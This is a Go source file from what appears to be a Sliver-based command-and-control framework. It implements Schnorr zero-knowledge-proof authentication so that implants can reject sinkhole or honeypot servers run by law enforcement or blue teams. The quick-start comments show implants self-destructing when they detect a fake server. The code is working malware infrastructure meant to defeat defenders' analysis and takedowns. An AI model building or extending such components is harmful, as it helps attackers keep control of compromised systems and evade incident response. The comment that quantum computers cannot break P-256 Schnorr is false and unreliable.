// Package zkp implements D-P12: Zero-Knowledge Proof Authentication for C2.
//
// ───────────────────────────────────────────────────────────────────────────
// THE PROBLEM WITH TRADITIONAL C2 AUTHENTICATION
// ───────────────────────────────────────────────────────────────────────────
//
// Standard C2 frameworks (including base Sliver) authenticate the C2 server
// to the implant using a shared secret — typically an AES key or HMAC key
// baked into the implant at compile time.
//
// The fundamental weakness: the implant stores the secret.
//
//   Scenario: law enforcement / blue team captures an implant binary
//   → reverse engineers the shared key k
//   → deploys a fake "sinkhole" C2 using k
//   → implant connects to fake C2 (thinks it's real)
//   → analyst learns: what commands the implant executes, its capabilities,
//                     its beaconing schedule, its network configuration
//   → analyst sends commands to enumerate other implants using the same key
//
// ───────────────────────────────────────────────────────────────────────────
// THE ZKP SOLUTION
// ───────────────────────────────────────────────────────────────────────────
//
// Replace the shared secret with a PUBLIC KEY + ZERO-KNOWLEDGE PROOF.
//
//   Operator keypair:    x  (private, stored in HSM / vault)
//                        X = x·G  (public, embedded in implant)
//
//   Authentication:
//     Implant knows X.  The REAL C2 knows x.  A fake C2 doesn't know x.
//     The C2 proves knowledge of x using a Schnorr ZKP without revealing x.
//
//   Security properties:
//     ✓ Capture implant → extract X (public key) — USELESS for impersonation
//     ✓ Intercept ALL traffic → observe ZKP proofs — CANNOT extract x
//     ✓ Fake C2 → implant rejects it (can't produce valid proof)
//     ✓ Even quantum computers cannot break this (using appropriate parameters)
//     ✓ Ring signature variant: hide WHICH operator is active
//
// ───────────────────────────────────────────────────────────────────────────
// CRYPTOGRAPHIC FOUNDATION
// ───────────────────────────────────────────────────────────────────────────
//
// Based on Schnorr's identification protocol (1990) with Fiat-Shamir heuristic
// for non-interactive proofs:
//
//   The Schnorr ZKP for discrete log:
//     Public:  X = x·G (a point on P-256)
//     Secret:  x (a 256-bit integer known only to the C2 operator)
//
//   Proof generation (C2 side):
//     r  ←R Z_p          (fresh random nonce per proof)
//     R  = r·G           (commitment — sent to implant)
//     c  = H(R||X||nonce||message||ts)  (Fiat-Shamir challenge)
//     s  = r + c·x  mod p    (response — sent to implant)
//     Proof = (R, s)
//
//   Proof verification (implant side):
//     c  = H(R||X||nonce||message||ts)  (recompute challenge)
//     Check: s·G == R + c·X             (the core equation)
//
//   Why this works:
//     If prover knows x: s·G = (r+cx)·G = r·G + cx·G = R + c·X  ✓
//     If prover doesn't know x: must solve for x from X — discrete log problem
//
//   Zero-knowledge: the proof (R, s) is a random-looking pair that reveals
//   nothing about x. Each proof uses fresh randomness r, so proofs are
//   computationally indistinguishable from random (HONEST-VERIFIER ZK).
//
// ───────────────────────────────────────────────────────────────────────────
// PACKAGE STRUCTURE
// ───────────────────────────────────────────────────────────────────────────
//
//   zkp/
//   ├── crypto/           Elliptic curve group operations (P-256)
//   │   └── curve.go      Scalar, Point, Group types + operations
//   ├── schnorr/          Core Schnorr ZKP
//   │   └── schnorr.go    KeyPair, Proof, Verifier, BatchVerify, Pedersen
//   ├── protocol/         Network handshake protocol
//   │   └── handshake.go  ImplantHandshake, C2Handshake, RingVerifier
//   ├── stager/           Stager integration
//   │   └── zkp_stager.go ZKP-first stager, keypair generation, self-destruct
//   └── zkp.go            This file — top-level API
//
// ───────────────────────────────────────────────────────────────────────────
// QUICK START
// ───────────────────────────────────────────────────────────────────────────
//
//   Step 1: Generate keypair (operator runs once per campaign):
//
//     privHex, pubHex, _ := stager.GenerateOperatorKeypair()
//     fmt.Println("Private:", privHex)  // Store in vault / HSM
//     fmt.Println("Public:",  pubHex)   // Embed in implant
//
//   Step 2: Embed public key in implant (compile-time):
//
//     // In implant source:
//     const c2PubKey = "\x02\xAB\xCD..."  // 33 bytes from Step 1
//
//   Step 3: Implant authentication (runtime):
//
//     result, err := zkp.AuthenticateC2(c2Addr, []byte(c2PubKey), sessionID)
//     if !result.Verified {
//         // HONEYPOT DETECTED — self-destruct
//         os.Exit(0)
//     }
//     // Continue with authenticated conn := result.Conn
//
//   Step 4: C2 side (operator's server):
//
//     kp := zkp.LoadKeyPair(privHex)
//     zkp.ServeAuthentication(listener, kp, domain)
//
package zkp

import (
	"fmt"
	"net"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zkp/protocol"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zkp/schnorr"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zkp/stager"
)

// ─── High-level API ───────────────────────────────────────────────────────

// AuthResult is returned by AuthenticateC2.
type AuthResult struct {
	Verified bool
	Conn     net.Conn // authenticated and ready for Sliver protocol
	Reason   string   // failure reason if !Verified
}

// AuthenticateC2 is the one-call implant-side API.
// It connects to c2Addr, runs the ZKP handshake, and returns:
//   - AuthResult.Verified = true  → Conn is authenticated, proceed normally
//   - AuthResult.Verified = false → ABORT, do NOT use Conn, consider self-destruct
func AuthenticateC2(c2Addr string, c2PublicKey []byte, sessionID string) (*AuthResult, error) {
	result, err := stager.Run(&stager.StagerConfig{
		C2PublicKey:           c2PublicKey,
		C2Addr:                c2Addr,
		SessionID:             sessionID,
		SelfDestructOnFailure: false, // caller decides whether to self-destruct
		MaxRetries:            3,
	})
	if err != nil {
		return &AuthResult{Verified: false, Reason: err.Error()}, err
	}
	return &AuthResult{
		Verified: result.Verified,
		Conn:     result.Conn,
		Reason:   result.FailReason,
	}, nil
}

// ServeAuth handles C2-side authentication for one incoming implant connection.
// privKeyHex is the 64-character hex private key from GenerateKeyPair.
func ServeAuth(conn net.Conn, privKeyHex string, domain string) error {
	kp, err := LoadPrivateKey(privKeyHex)
	if err != nil {
		return err
	}
	h := protocol.NewC2Handshake(kp, domain)
	return h.Respond(conn)
}

// ─── Key management ───────────────────────────────────────────────────────

// GenerateKeyPair creates a fresh P-256 Schnorr keypair.
// Returns (privateKeyHex, publicKeyBytes, error).
// privateKeyHex: store securely (vault, HSM, encrypted file).
// publicKeyBytes: 33-byte compressed point, embed in implant.
func GenerateKeyPair() (string, []byte, error) {
	kp, err := schnorr.GenerateKeyPair()
	if err != nil {
		return "", nil, err
	}
	return fmt.Sprintf("%x", kp.PrivateKey.Bytes()),
		kp.PublicKey.Bytes(),
		nil
}

// LoadPrivateKey deserializes a private key from hex.
func LoadPrivateKey(hexKey string) (*schnorr.KeyPair, error) {
	if len(hexKey) != 64 {
		return nil, fmt.Errorf("private key must be 64 hex chars (32 bytes), got %d", len(hexKey))
	}
	var privBytes [32]byte
	for i := 0; i < 32; i++ {
		b, err := hexByte(hexKey[i*2], hexKey[i*2+1])
		if err != nil {
			return nil, fmt.Errorf("invalid hex at position %d: %w", i, err)
		}
		privBytes[i] = b
	}
	return schnorr.KeyPairFromPrivateBytes(privBytes[:])
}

// PublicKeyEmbed returns Go source code for embedding the public key.
func PublicKeyEmbed(pubKeyBytes []byte) string {
	return stager.EmbedPublicKey(pubKeyBytes)
}

// ─── Ring signature API ───────────────────────────────────────────────────

// RingKeySet holds N public keys — any one can authenticate.
type RingKeySet = protocol.RingKeySet

// NewRingVerifier creates a verifier that accepts proofs from any ring member.
func NewRingVerifier(pubKeys [][]byte) (*protocol.RingVerifier, error) {
	return protocol.NewRingVerifier(&RingKeySet{PublicKeys: pubKeys})
}

// ─── Helpers ──────────────────────────────────────────────────────────────

func hexByte(hi, lo byte) (byte, error) {
	h, err := hexNibble(hi)
	if err != nil {
		return 0, err
	}
	l, err := hexNibble(lo)
	if err != nil {
		return 0, err
	}
	return (h << 4) | l, nil
}

func hexNibble(c byte) (byte, error) {
	switch {
	case c >= '0' && c <= '9':
		return c - '0', nil
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10, nil
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10, nil
	default:
		return 0, fmt.Errorf("invalid hex character: %c", c)
	}
}
